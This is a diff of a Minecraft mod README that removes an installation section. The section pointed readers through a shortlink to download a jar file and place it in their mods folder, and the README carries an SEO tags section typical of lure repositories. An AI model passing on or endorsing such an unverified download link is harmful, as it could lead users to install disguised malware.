@@ -66,17 +66,6 @@ territory or getting banned.
 - 🌾 Harvest helper (no auto-farm)
 - 🐴 Horse stats viewer
 
----
-
-## [📥 Installation](https://share.google/8Ujwwl735ztNcfA7q)
-
-```bash
-1. Download Nature-1.8.9.jar
-2. Add to mods folder
-3. Works with Forge/Fabric
-4. Press N for settings
-```
-
 ## 📦 SEO TAGS
 
 Ignore:
